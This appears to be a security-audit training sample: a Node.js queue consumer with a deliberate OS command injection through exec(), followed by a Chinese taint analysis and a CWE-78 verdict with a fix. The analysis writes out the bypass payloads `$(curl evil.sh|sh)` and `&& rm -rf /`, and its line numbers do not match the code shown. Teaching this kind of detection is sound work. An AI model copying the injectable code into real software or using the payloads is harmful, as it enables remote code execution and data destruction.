@@ -1,0 +1,42 @@
+LANG: javascript
+```javascript
+// config-ingest.js
+// 被上层服务调用：消费 'config.submit' 队列消息，解析外部提交的配置清单并应用钩子
+const { exec } = require('child_process');
+const yaml = require('js-yaml');
+
+const queue = require('./mq-client').channel('configs');
+
+// 弱防御：仅拦截分号与反引号，可被 $(...) 命令替换绕过
+function sanitize(value) {
+  return String(value).replace(/[;`]/g, '');
+}
+
+queue.consume('config.submit', (message) => {
+  // message.content 为外部提交的 YAML 配置文件内容（不可信）
+  const manifest = yaml.load(message.content.toString());
+
+  if (!manifest || !manifest.hooks) {
+    return;
+  }
+
+  for (const hook of manifest.hooks) {
+    const cmd = `deploy-hook ${sanitize(hook.name)} --target ${hook.target}`;
+    // 危险 sink：拼接外部数据后执行 shell 命令
+    exec(cmd, { cwd: '/srv/deploy' }, (err, stdout) => {
+      if (err) console.error('hook failed:', err.message);
+      else console.log(`hook output: ${stdout}`);
+    });
+  }
+});
+```
+
+1. 第 1 行至第 17 行：本文件没有任何 request/input/environ 等显式 web 入口；污点边界是第 16 行队列消费者回调签名 `(message)`——消息体 `message.content` 承载外部提交的配置文件内容，属于公开接口接收的外部数据，必须按不可信处理，是等效污点源。
+2. 第 18 行：`yaml.load(message.content.toString())` 将污点反序列化为对象，`manifest.hooks[].name/target` 全部继承污点属性，无 schema 校验或字段白名单。
+3. 第 24 行：`sanitize` 是黑名单式弱防御，仅删除 `;` 和反引号；攻击者可在 name 中注入 `$(curl evil.sh|sh)` 或 `&& rm -rf /` 等形式绕过（未过滤 `$`、`&`、`|`、换行），且该函数只作用于 `hook.name`，完全不覆盖 `hook.target` 字段。
+4. 第 25 行：污点 `hook.name`/`hook.target` 直接拼入模板字符串形成 `cmd`，随后第 27 行 `exec(cmd, ...)` 以 shell 方式执行——source 到 sink 的可达路径完整成立，且因弱过滤可绕过 + target 无任何过滤，构成有效命令注入。
+5. 第二入口检查：本模块仅注册一个消费者回调，无其他路由、参数或间接调用通道；但同一回调内 hooks 数组可含多个元素，每条 hook 都是一条独立的 source→sink 流，结论不变。
+
+```json
+{"has_vulnerability": true, "vulnerability_type": "CWE-78 OS Command Injection", "risk_level": "Critical", "source": "line 16: 队列回调参数 message.content（外部提交的配置文件）", "sink": "line 27: exec(cmd) 拼接执行 shell 命令", "explanation": "line 16 回调参数 message.content 为等效污点源 -> line 18 yaml.load 解析使 hooks.name/target 继承污点 -> line 24 sanitize 仅黑名单过滤 ; 与反引号，可用 $() 、&& 、| 绕过且不覆盖 target 字段 -> line 25 拼接进 cmd -> line 27 exec 执行，命令注入成立; 第二入口检查：仅此一个消费者回调，无其他路由或间接通道，但 hooks 数组每项均为独立污点流，均可达 sink", "fix_suggestion": "line 27: 改用 execFile 并以数组传参（execFile('deploy-hook', [hook.name, '--target', hook.target])），同时对 hook.name/target 做 ^[A-Za-z0-9._-]+$ 白名单校验"}
+```
